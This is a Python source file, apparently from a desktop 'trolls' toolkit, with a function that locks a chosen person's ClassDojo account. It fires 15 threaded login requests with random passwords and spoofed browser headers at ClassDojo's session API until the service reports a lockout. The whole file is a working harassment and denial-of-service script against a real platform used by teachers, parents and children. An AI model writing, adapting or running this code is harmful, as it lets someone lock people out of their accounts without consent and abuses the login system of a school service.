import threading

import requests

import dearpygui.dearpygui as dpg

import Libs.General
import themes
from Libs import ThreadManager
from Libs.StatusManager import status


def classdojo_account_locker_request(email:str, result_text:str):
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/json',
        'Origin': 'https://www.classdojo.com',
        'Sec-GPC': '1',
        'Connection': 'keep-alive',
        'Referer': 'https://www.classdojo.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'Priority': 'u=0',
    }

    params = {
        'duration': 'long',
    }

    json_data = {
        'login': email,
        'password': Libs.General.random_string(12),
        'resumeAddClassFlow': False,
    }

    res = requests.post('https://home.classdojo.com/api/session', params=params, headers=headers, json=json_data)
    data = res.json()

    error_details = data.get("error")
    if error_details == None:
        themes.set_colored_result(result_text, f"uhhhh idk how this happened but you got into the account lol.", "Red")
        return

    attemptsLeft = error_details.get("extras", {}).get("remainingAttempts")

    error_code = error_details.get("code")

    if status.read("trolls/classdojo_account_locker/stop", False) == False:
        if attemptsLeft != None and error_code == "ERR_INCORRECT_PASSWORD":
            themes.set_colored_result(result_text, f"locking account...\nattempt: {attemptsLeft}", "Mauve")
        elif error_code == "ERR_ACCOUNT_LOCKED_OUT":
            status.write("trolls/classdojo_account_locker/stop", True)
            status.write("trolls/classdojo_account_locker/didLock", True)
            return
        elif attemptsLeft is not None and error_code != "ERR_INCORRECT_PASSWORD" or error_code != "ERR_ACCOUNT_LOCKED_OUT":
            themes.set_colored_result(result_text, f"{error_code} weird code but still got attempts: {attemptsLeft}\n{data}", "Red")
        else:
            themes.set_colored_result(result_text, f"something happened idk\n{data}", "Red")
            status.write("trolls/classdojo_account_locker/stop", True)
            return

def classdojo_account_locker():
    result_text = "trolls.classdojo_account_locker_result_text"

    email = dpg.get_value("trolls.classdojo_account_locker").strip()

    if not email:
        themes.set_colored_result(result_text, "you kinda forgot the email...", "Red")
        return


    themes.set_colored_result(result_text, "locking account...", "Mauve")
    for i in range(15):
        ThreadManager.do_thread(classdojo_account_locker_request, (email, result_text,))
    ThreadManager.clear_threads()
    if status.read("trolls/classdojo_account_locker/didLock", False):
        themes.set_colored_result(result_text, f"account has been locked", "Green")
    status.reset("trolls/classdojo_account_locker")